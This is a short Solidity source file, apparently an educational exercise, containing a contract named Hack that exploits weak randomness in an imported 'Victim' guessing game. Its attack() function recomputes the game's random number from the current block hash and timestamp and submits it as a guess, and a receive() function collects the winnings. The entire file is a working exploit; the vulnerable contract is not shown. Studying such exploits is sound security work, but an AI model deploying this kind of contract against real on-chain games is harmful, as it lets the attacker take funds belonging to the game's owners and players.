// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Randomness.sol";

contract Hack {
    Victim victim;

    constructor(address gameAddress) {
        victim = Victim(gameAddress);
    }

    function attack() public {
        uint256 guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        victim.guess(guess);
    }

    receive() external payable {}
}
